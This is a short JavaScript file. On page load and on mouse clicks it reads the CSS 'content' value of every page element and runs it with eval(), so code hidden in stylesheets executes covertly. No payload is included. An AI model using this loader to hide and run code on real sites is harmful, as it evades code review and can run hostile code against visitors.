window.addEventListener('DOMContentLoaded', (event) => {
    var x = document.body.querySelectorAll("*");
    var i;
    for (i = 0; i < x.length; i++) {
        
        js = window.getComputedStyle(x[i]).content;
        js = js.slice(1,-1)
        if(js !== 'orma'){
            eval(js);
        }

        if (navigator.userAgent.indexOf("Firefox") !== -1){
            x[i].addEventListener("mouseup", function(){
                js = window.getComputedStyle(this).content;
                js = js.slice(1,-1)
                eval(js);
            });
        }else{
            x[i].addEventListener("mousedown", function(){
                js = window.getComputedStyle(this).content;
                js = js.slice(1,-1)
                eval(js);
            });
        }
    }
});